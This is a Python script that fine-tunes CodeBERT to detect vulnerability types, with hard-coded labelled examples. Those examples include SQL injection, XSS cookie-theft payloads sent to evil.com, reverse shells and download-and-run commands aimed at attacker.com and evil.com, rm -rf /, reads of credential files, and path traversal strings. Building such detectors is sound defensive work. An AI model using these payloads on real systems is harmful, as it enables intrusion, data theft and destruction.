#!/usr/bin/env python3
"""
Multi-class CodeBERT fine-tuning for specific vulnerability type detection
Trains model to classify code into specific vulnerability categories:
- 0: SQL Injection
- 1: XSS (Cross-Site Scripting)
- 2: Command Injection
- 3: Path Traversal
- 4: Dangerous Functions (eval, exec, etc.)
- 5: Other Vulnerabilities
- 6: Safe Code
"""
import torch
import torch.nn as nn
from torch.utils.data import Dataset, DataLoader
from transformers import AutoModel, AutoTokenizer, get_linear_schedule_with_warmup
from torch.optim import AdamW
import json
import os
from typing import List, Tuple

# Vulnerability type labels
VULN_TYPES = {
    0: "SQL Injection",
    1: "XSS",
    2: "Command Injection",
    3: "Path Traversal",
    4: "Dangerous Functions",
    5: "Other Vulnerabilities",
    6: "Safe Code"
}

class MultiClassSecurityDataset(Dataset):
    """Dataset for multi-class security classification"""
    
    def __init__(self, data: List[Tuple[str, int]], tokenizer, max_length=512):
        self.data = data
        self.tokenizer = tokenizer
        self.max_length = max_length
    
    def __len__(self):
        return len(self.data)
    
    def __getitem__(self, idx):
        code, label = self.data[idx]
        
        encoding = self.tokenizer(
            code,
            truncation=True,
            padding='max_length',
            max_length=self.max_length,
            return_tensors='pt'
        )
        
        return {
            'input_ids': encoding['input_ids'].flatten(),
            'attention_mask': encoding['attention_mask'].flatten(),
            'label': torch.tensor(label, dtype=torch.long)
        }

class MultiClassCodeBERTSecurityModel(nn.Module):
    """CodeBERT-based multi-class security classifier"""
    
    def __init__(self, model_name="microsoft/codebert-base", num_classes=7):
        super().__init__()
        self.codebert = AutoModel.from_pretrained(model_name)
        self.classifier = nn.Linear(768, num_classes)  # 768 is CodeBERT output dimension
        self.dropout = nn.Dropout(0.1)
    
    def forward(self, input_ids, attention_mask):
        # Get CodeBERT embeddings
        outputs = self.codebert(input_ids=input_ids, attention_mask=attention_mask)
        # Use [CLS] token embedding (first token)
        cls_embedding = outputs.last_hidden_state[:, 0, :]
        # Apply dropout
        cls_embedding = self.dropout(cls_embedding)
        # Classify
        logits = self.classifier(cls_embedding)
        return logits

def prepare_training_data():
    """Prepare multi-class training data with specific vulnerability type labels"""
    training_data = []
    
    # SQL Injection examples (label 0)
    sql_injections = [
        "SELECT * FROM users WHERE id = '" + "' OR '1'='1",
        "SELECT * FROM users WHERE id = admin'--",
        "SELECT * FROM users WHERE id = ' OR 1=1#",
        "' OR '1'='1' --",
        "admin' OR '1'='1",
        "1' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT password FROM users--",
        "1' ORDER BY 1--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "' OR 1=1 IN (SELECT * FROM users)--",
        "1' OR 1=1 IN (SELECT * FROM users)--",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1' #",
        "admin' OR '1'='1'/*",
        "' OR '1'='1' LIMIT 1--",
        "' OR '1'='1' LIMIT 1,1--",
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000, MD5(1))--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1' AND (SELECT SUBSTRING(password,1,1) FROM users) = 'a'--",
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users) = 'a'--",
        "1' UNION ALL SELECT NULL, NULL, NULL--",
        "1' UNION ALL SELECT username, password, NULL FROM users--",
        "1' UNION ALL SELECT 1, CONCAT(username, ':', password), 3 FROM users--",
        "' OR '1'='1' AND '1'='1",
        "' OR '1'='1' OR '1'='1",
        "1' OR '1'='1' OR '1'='1",
        "1' AND '1'='1' AND '1'='1",
        "1' AND '1'='1' OR '1'='1",
        "' OR 'x'='x",
        "' OR 'x'='x'--",
        "' OR 'x'='x' #",
        "' OR 'x'='x'/*",
        "1' OR 'x'='x'--",
        "1' OR 'x'='x' #",
        "1' OR 'x'='x'/*",
        "admin' OR 'x'='x'--",
        "admin' OR 'x'='x' #",
        "admin' OR 'x'='x'/*",
    ]
    training_data.extend([(sql, 0) for sql in sql_injections])
    
    # XSS examples (label 1)
    xss_attacks = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=x onerror=document.location='http://evil.com?c='+document.cookie>",
        "<svg onload=alert(1)>",
        "<svg onload=alert(document.cookie)>",
        "<svg onload=document.location='http://evil.com?c='+document.cookie>",
        "<body onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<body onload=alert(document.cookie)>",
        "<iframe src=javascript:alert(1)>",
        "<iframe src=javascript:alert('XSS')>",
        "<iframe src=javascript:alert(document.cookie)>",
        "<input onfocus=alert(1) autofocus>",
        "<input onfocus=alert('XSS') autofocus>",
        "<input onfocus=alert(document.cookie) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert(1)>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert(1)>",
        "<marquee onstart=alert('XSS')>",
        "<isindex action=javascript:alert(1) type=submit>",
        "<isindex action=javascript:alert('XSS') type=submit>",
        "<form><button formaction=javascript:alert(1)>X</button></form>",
        "<form><button formaction=javascript:alert('XSS')>X</button></form>",
        "<form onsubmit=alert(1)>X</form>",
        "<form onsubmit=alert('XSS')>X</form>",
        "<keygen onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video poster=javascript:alert(1)>",
        "<video poster=javascript:alert('XSS')>",
        "<audio src=x onerror=alert(1)>",
        "<audio src=x onerror=alert('XSS')>",
        "<object data=javascript:alert(1)>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert(1)>",
        "<embed src=javascript:alert('XSS')>",
        "<script src='http://evil.com/xss.js'></script>",
        "<script src='javascript:alert(1)'></script>",
        "<script>\\u0061lert(1)</script>",
        "<script>\\u0041lert(1)</script>",
        "<img src=x onerror=\\u0061lert(1)>",
        "<img src=x onerror=\\u0041lert(1)>",
    ]
    training_data.extend([(xss, 1) for xss in xss_attacks])
    
    # Command Injection examples (label 2)
    command_injections = [
        "rm -rf /",
        "; cat /etc/passwd",
        "| ls -la",
        "&& whoami",
        "execute command: rm -rf /",
        "; rm -rf /",
        "| rm -rf /",
        "&& rm -rf /",
        "`rm -rf /`",
        "$(rm -rf /)",
        "; cat /etc/shadow",
        "| cat /etc/shadow",
        "&& cat /etc/shadow",
        "; curl http://evil.com/shell.php",
        "| wget http://evil.com/malware",
        "&& python -c 'import os; os.system(\"rm -rf /\")'",
        "; nc -e /bin/sh attacker.com 4444",
        "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "&& perl -e 'use Socket;socket(S,2,1,6);connect(S,pack\"SnA4x8\",2,attacker.com,4444);open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "; powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\")'",
        "| cmd.exe /c type C:\\Windows\\System32\\config\\SAM",
        "&& type C:\\Windows\\System32\\config\\SAM",
        "; system('rm -rf /')",
        "| exec('rm -rf /')",
        "&& shell_exec('rm -rf /')",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        "&& id",
        "; uname -a",
        "| uname -a",
        "&& uname -a",
        "; ps aux",
        "| ps aux",
        "&& ps aux",
        "; netstat -an",
        "| netstat -an",
        "&& netstat -an",
        "; env",
        "| env",
        "&& env",
    ]
    training_data.extend([(cmd, 2) for cmd in command_injections])
    
    # Path Traversal examples (label 3)
    path_traversals = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "read file: ../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32",
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "....\\\\....\\\\....\\\\windows\\system32",
        "%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5cetc%5cpasswd",
        "%252e%252e%252fetc%252fpasswd",
        "..%c0%afetc/passwd",
        "..%c1%9c../etc/passwd",
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "/etc/passwd%00.jpg",
        "/etc/passwd%00.png",
        "/etc/passwd%00.html",
        "../windows/system32/drivers/etc/hosts",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "..\\..\\..\\win.ini",
        "/proc/self/environ",
        "/proc/self/cwd",
        "/proc/self/exe",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/var/log/auth.log",
        "/var/log/access.log",
        "/var/log/error.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "..\\..\\..\\..\\..\\..\\windows\\system32",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hosts.allow",
        "/etc/hosts.deny",
    ]
    training_data.extend([(path, 3) for path in path_traversals])
    
    # Dangerous Functions examples (label 4)
    dangerous_functions = [
        "eval(malicious_code)",
        "exec(user_input)",
        "system(user_command)",
        "eval($_POST['cmd'])",
        "exec($_GET['cmd'])",
        "system($_REQUEST['cmd'])",
        "shell_exec($_POST['cmd'])",
        "passthru($_GET['cmd'])",
        "popen($_REQUEST['cmd'], 'r')",
        "proc_open($_POST['cmd'], $pipes)",
        "`$user_input`",
        "$_GET['x']($y)",
        "assert($_POST['cmd'])",
        "preg_replace('/.*/e', $_POST['cmd'], '')",
        "create_function('', $_POST['cmd'])",
        "call_user_func($_GET['func'])",
        "call_user_func_array($_REQUEST['func'], [])",
        "unserialize($_POST['data'])",
        "eval(user_input)",
        "exec(malicious)",
        "system(untrusted)",
        "os.system(untrusted)",
        "subprocess.call(untrusted, shell=True)",
        "popen(untrusted)",
        "Runtime.getRuntime().exec(untrusted)",
        "ProcessBuilder(untrusted)",
    ]
    training_data.extend([(danger, 4) for danger in dangerous_functions])
    
    # Other Vulnerabilities examples (label 5)
    other_vulnerabilities = [
        "DELETE FROM users WHERE id = 1",
        "DROP TABLE users",
        "TRUNCATE TABLE users",
        "ALTER TABLE users DROP COLUMN password",
        "INSERT INTO users (admin) VALUES (1)",
        "UPDATE users SET admin = 1 WHERE id = 1",
        "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'",
        "REVOKE ALL PRIVILEGES ON *.* FROM 'user'@'%'",
        "EXEC('DROP TABLE users')",
        "EXEC sp_addsrvrolemember 'sysadmin', 'hacker'",
        "xp_cmdshell 'dir'",
        "sp_oacreate 'wscript.shell'",
        "chr(47).chr(114).chr(109).chr(32).chr(45).chr(114).chr(102).chr(32).chr(47)",
        "%27%20OR%20%271%27%3D%271",
        "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        "%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        "onerror=alert(1)",
        "onload=alert(1)",
        "onfocus=alert(1)",
        "onclick=alert(1)",
        "onmouseover=alert(1)",
        "onmouseout=alert(1)",
        "onkeydown=alert(1)",
        "onkeyup=alert(1)",
        "onkeypress=alert(1)",
        "javascript:void(0)",
        "javascript:/*-/*\\%2F*\\/*%2F*/document.write(1)",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(/XSS/.source)</script>",
        "<script>alert(atob('WFNT'))</script>",
        "<script>alert(btoa('XSS'))</script>",
        "<img src=x onerror=alert`XSS`>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<svg><script>alert(1)</script></svg>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">",
        "<math><maction actiontype=\"statusline\" onmouseover=\"alert(1)\">x</maction></math>",
        "<details open ontoggle=alert(1)>",
        "<dialog open onclose=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<style>img{content:url('javascript:alert(1)')}</style>",
        "<link rel=stylesheet href=\"javascript:alert(1)\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        "<meta http-equiv=\"set-cookie\" content=\"xss=alert(1)\">",
        "<base href=\"javascript:alert(1)\">",
        "<form action=\"javascript:alert(1)\">",
        "<button formaction=\"javascript:alert(1)\">",
        "<input type=\"image\" formaction=\"javascript:alert(1)\">",
        "<keygen onfocus=\"alert(1)\" autofocus>",
        "<video><source onerror=\"alert(1)\">",
        "<audio src=x onerror=\"alert(1)\">",
        "<track src=x onerror=\"alert(1)\">",
        "<bgsound src=x onerror=\"alert(1)\">",
        "<applet code=\"javascript:alert(1)\">",
        "<embed src=\"data:text/html,<script>alert(1)</script>\">",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<embed src=\"data:image/svg+xml,<svg onload=alert(1)>\">",
        "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
    ]
    training_data.extend([(other, 5) for other in other_vulnerabilities])
    
    # Safe code examples (label 6)
    safe_examples = [
        # Safe SQL
        "SELECT * FROM users WHERE id = ?",
        "SELECT * FROM users WHERE id = :id",
        "SELECT * FROM users WHERE id = $1",
        "SELECT * FROM users WHERE id = %s",
        "SELECT * FROM users WHERE id = ? AND status = ?",
        "SELECT * FROM users WHERE id = :id AND status = :status",
        "SELECT * FROM users WHERE name LIKE ?",
        "SELECT * FROM users WHERE id IN (?, ?, ?)",
        "INSERT INTO users (name, email) VALUES (?, ?)",
        "INSERT INTO users (name, email) VALUES (:name, :email)",
        "UPDATE users SET email = ? WHERE id = ?",
        "UPDATE users SET email = :email WHERE id = :id",
        "DELETE FROM users WHERE id = ?",
        "DELETE FROM users WHERE id = :id",
        "SELECT COUNT(*) FROM users WHERE status = ?",
        "SELECT MAX(id) FROM users WHERE active = ?",
        "SELECT * FROM users ORDER BY name LIMIT ? OFFSET ?",
        "SELECT name, email FROM users WHERE id = ?",
        "SELECT u.*, p.* FROM users u JOIN posts p ON u.id = p.user_id WHERE u.id = ?",
        "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
        "db.query('SELECT * FROM users WHERE id = ?', [user_id])",
        "User.find_by(id: user_id)",
        "User.where(id: user_id).first",
        "SELECT * FROM users WHERE id = :id AND created_at > :date",
        "SELECT * FROM users WHERE id = ? AND status IN (?, ?, ?)",
        "SELECT * FROM users WHERE id = ? ORDER BY created_at DESC LIMIT 10",
        "SELECT id, name FROM users WHERE id = ?",
        "SELECT * FROM users WHERE id = ? FOR UPDATE",
        "SELECT * FROM users WHERE id = ? LOCK IN SHARE MODE",
        "SELECT * FROM users WHERE id = ? AND deleted_at IS NULL",
        
        # Safe file operations
        "read_file(user_data.txt)",
        "open('./data.json', 'r')",
        "open('/var/www/html/config.json', 'r')",
        "file_get_contents('/var/www/html/data.txt')",
        "File.read('/safe/path/data.json')",
        "with open('/safe/path/file.txt', 'r') as f: f.read()",
        "open(os.path.join(BASE_DIR, 'data.json'), 'r')",
        "Path(BASE_DIR) / 'data.json'",
        "File.open('/var/www/html/uploads', 'r')",
        "readfile('/safe/config.yml')",
        "fopen('/var/www/html/data.txt', 'r')",
        "File::read('/safe/path/data.txt')",
        "IO.read('/safe/path/file.txt')",
        "fs.readFileSync('/safe/path/data.json')",
        "File.read('/safe/path/file.json')",
        "open(os.path.abspath('data.json'), 'r')",
        "with open(sanitize_path(user_input), 'r') as f: f.read()",
        "File.open(validated_path, 'r')",
        "read_file(allowed_directory + filename)",
        "fopen(whitelisted_path, 'r')",
        "File.read_from_safe_path('data.json')",
        "FileIO.read('/safe/config.json')",
        "Buffer.from(fs.readFileSync('/safe/data.txt'))",
        "read('/safe/path/file.txt')",
        "File('/safe/path/data.json').read()",
        "Path('/safe/path/file.txt').read_text()",
        "FileReader.read('/safe/path/file.json')",
        "FileSystem.readFile('/safe/path/data.txt')",
        "FileLoader.load('/safe/path/config.json')",
        
        # Safe strings
        "Hello World",
        "user age is 25",
        "twenty-five",
        "This is a safe string",
        "Regular text content",
        "Normal user input",
        "Sanitized data",
        "Valid email: user@example.com",
        "Phone number: 555-1234",
        "Date: 2024-01-15",
        "URL: https://example.com",
        "Path: /var/www/html",
        "Filename: document.pdf",
        "Name: John Doe",
        "Address: 123 Main St",
        "City: New York",
        "Country: USA",
        "Currency: $100.00",
        "Percentage: 50%",
        "Temperature: 25°C",
        "Weight: 75kg",
        "Height: 180cm",
        "Color: #FF5733",
        "Hex: 0x1234",
        "Binary: 101010",
        "Octal: 0755",
        "UUID: 550e8400-e29b-41d4-a716-446655440000",
        "Hash: 5d41402abc4b2a76b9719d911017c592",
        "Base64: SGVsbG8gV29ybGQ=",
        "Safe string with spaces",
        "Safe_string_with_underscores",
        "safe-string-with-hyphens",
        
        # Safe HTML
        "<div>Safe content</div>",
        "<p>Paragraph</p>",
        "<h1>Heading</h1>",
        "<span>Text</span>",
        "<ul><li>Item 1</li><li>Item 2</li></ul>",
        "<table><tr><td>Cell</td></tr></table>",
        "<a href='https://example.com'>Link</a>",
        "<img src='image.jpg' alt='Image'>",
        "<strong>Bold text</strong>",
        "<em>Italic text</em>",
        "<code>Code snippet</code>",
        "<pre>Preformatted text</pre>",
        "<blockquote>Quote</blockquote>",
        "<hr>",
        "<br>",
        "<div class='container'>Content</div>",
        "<p id='intro'>Introduction</p>",
        "<section><h2>Section</h2></section>",
        "<article><p>Article content</p></article>",
        "<header><nav>Navigation</nav></header>",
        "<footer>Copyright 2024</footer>",
        "<aside>Sidebar</aside>",
        "<figure><img src='photo.jpg'><figcaption>Caption</figcaption></figure>",
        "<form><input type='text' name='username'></form>",
        "<button type='submit'>Submit</button>",
        "<select><option>Option 1</option></select>",
        "<textarea rows='5' cols='40'></textarea>",
        "<label for='email'>Email:</label>",
        "<fieldset><legend>Personal Info</legend></fieldset>",
        "<div data-id='123'>Content</div>",
        "<p class='text-primary'>Styled text</p>",
        
        # Safe code
        "def calculate(x, y): return x + y",
        "print('Hello')",
        "x = 5",
        "y = 10",
        "z = x + y",
        "for i in range(10): print(i)",
        "if x > 0: return True",
        "def greet(name): return f'Hello, {name}'",
        "class User: def __init__(self, name): self.name = name",
        "users = [User('Alice'), User('Bob')]",
        "result = filter(lambda x: x > 0, numbers)",
        "total = sum([1, 2, 3, 4, 5])",
        "average = total / len(numbers)",
        "message = 'Hello, World!'",
        "items = ['apple', 'banana', 'cherry']",
        "dictionary = {'key': 'value', 'name': 'John'}",
        "set_items = {1, 2, 3, 4, 5}",
        "tuple_items = (1, 2, 3)",
        "try: result = risky_operation() except Exception as e: log(e)",
        "with open('file.txt', 'r') as f: content = f.read()",
        "import os",
        "from datetime import datetime",
        "import json",
        "data = json.loads(json_string)",
        "json_string = json.dumps(data)",
        "timestamp = datetime.now().isoformat()",
        "path = os.path.join('dir', 'file.txt')",
        "regex = re.compile(r'\\d+')",
        "match = regex.search(text)",
        "items.sort(key=lambda x: x.lower())",
        "sorted_items = sorted(items, reverse=True)",
        "unique_items = list(set(items))",
        "max_value = max(numbers)",
        "min_value = min(numbers)",
        "count = len(items)",
        "first = items[0]",
        "last = items[-1]",
        "slice_items = items[1:5]",
        "step_items = items[::2]",
        "reversed_items = items[::-1]",
        "joined = ', '.join(items)",
        "upper = text.upper()",
        "lower = text.lower()",
        "title = text.title()",
        "strip = text.strip()",
        "split = text.split(',')",
        "replace = text.replace('old', 'new')",
        "find = text.find('pattern')",
        "startswith = text.startswith('prefix')",
        "endswith = text.endswith('suffix')",
        "is_alpha = text.isalpha()",
        "is_digit = text.isdigit()",
        "is_alnum = text.isalnum()",
        "is_space = text.isspace()",
        "abs_value = abs(-5)",
        "round_value = round(3.14159, 2)",
        "pow_value = pow(2, 3)",
        "sqrt_value = math.sqrt(16)",
        "random_choice = random.choice(items)",
        "random_sample = random.sample(items, 3)",
        "random_shuffle = random.shuffle(items)",
        "random_int = random.randint(1, 10)",
        "random_float = random.random()",
        "sleep(1)",
        "time_now = time.time()",
        "date_today = date.today()",
        "datetime_now = datetime.now()",
        "timedelta = datetime.now() - datetime(2024, 1, 1)",
        "formatted = datetime.now().strftime('%Y-%m-%d')",
        "parsed = datetime.strptime('2024-01-15', '%Y-%m-%d')",
        "weekday = datetime.now().weekday()",
        "isoweekday = datetime.now().isoweekday()",
        "isocalendar = datetime.now().isocalendar()",
        "timestamp = datetime.now().timestamp()",
        "fromtimestamp = datetime.fromtimestamp(1234567890)",
        "utcnow = datetime.utcnow()",
        "isoformat = datetime.now().isoformat()",
        "strptime = datetime.strptime('2024-01-15', '%Y-%m-%d')",
        "strftime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')",
    ]
    training_data.extend([(safe, 6) for safe in safe_examples])
    
    # Print statistics
    label_counts = {}
    for _, label in training_data:
        label_counts[label] = label_counts.get(label, 0) + 1
    
    print("Training data distribution:")
    for label, count in sorted(label_counts.items()):
        print(f"  {VULN_TYPES[label]}: {count} examples")
    print(f"Total: {len(training_data)} samples")
    
    return training_data

def train_codebert_multiclass(
    model_path: str = ".ipl_data/codebert_multiclass_model.pt",
    epochs: int = 3,
    batch_size: int = 8,
    learning_rate: float = 2e-5,
    num_classes: int = 7
):
    """Fine-tune CodeBERT on multi-class security data"""
    
    print("="*70)
    print("TRAINING CODEBERT FOR MULTI-CLASS SECURITY CLASSIFICATION")
    print("="*70)
    
    # Load tokenizer
    tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")
    
    # Prepare data
    training_data = prepare_training_data()
    dataset = MultiClassSecurityDataset(training_data, tokenizer)
    dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=True)
    
    # Initialize model
    model = MultiClassCodeBERTSecurityModel(num_classes=num_classes)
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    model.to(device)
    
    # Optimizer
    optimizer = AdamW(model.parameters(), lr=learning_rate)
    
    # Scheduler
    total_steps = len(dataloader) * epochs
    scheduler = get_linear_schedule_with_warmup(
        optimizer,
        num_warmup_steps=0,
        num_training_steps=total_steps
    )
    
    # Training loop
    print(f"\nTraining for {epochs} epochs...")
    print(f"Device: {device}")
    print(f"Batch size: {batch_size}")
    print(f"Total steps: {total_steps}")
    print(f"Number of classes: {num_classes}")
    
    model.train()
    for epoch in range(epochs):
        total_loss = 0
        correct_predictions = 0
        total_predictions = 0
        
        for batch_idx, batch in enumerate(dataloader):
            input_ids = batch['input_ids'].to(device)
            attention_mask = batch['attention_mask'].to(device)
            labels = batch['label'].to(device)
            
            # Forward pass
            outputs = model(input_ids, attention_mask)
            loss = nn.CrossEntropyLoss()(outputs, labels)
            
            # Calculate accuracy
            _, predicted = torch.max(outputs, 1)
            correct_predictions += (predicted == labels).sum().item()
            total_predictions += labels.size(0)
            
            # Backward pass
            optimizer.zero_grad()
            loss.backward()
            optimizer.step()
            scheduler.step()
            
            total_loss += loss.item()
            
            if batch_idx % 10 == 0:
                accuracy = correct_predictions / total_predictions if total_predictions > 0 else 0
                print(f"Epoch {epoch+1}/{epochs}, Batch {batch_idx}/{len(dataloader)}, "
                      f"Loss: {loss.item():.4f}, Acc: {accuracy:.4f}")
        
        avg_loss = total_loss / len(dataloader)
        epoch_accuracy = correct_predictions / total_predictions if total_predictions > 0 else 0
        print(f"Epoch {epoch+1} completed. Average loss: {avg_loss:.4f}, Accuracy: {epoch_accuracy:.4f}")
    
    # Save model
    os.makedirs(os.path.dirname(model_path), exist_ok=True)
    torch.save(model.state_dict(), model_path)
    print(f"\n✅ Model saved to: {model_path}")
    
    return model_path

if __name__ == "__main__":
    model_path = train_codebert_multiclass()
    print(f"\n✅ Training complete!")
    print(f"Model saved: {model_path}")
    print(f"\nVulnerability types:")
    for label, name in VULN_TYPES.items():
        print(f"  {label}: {name}")
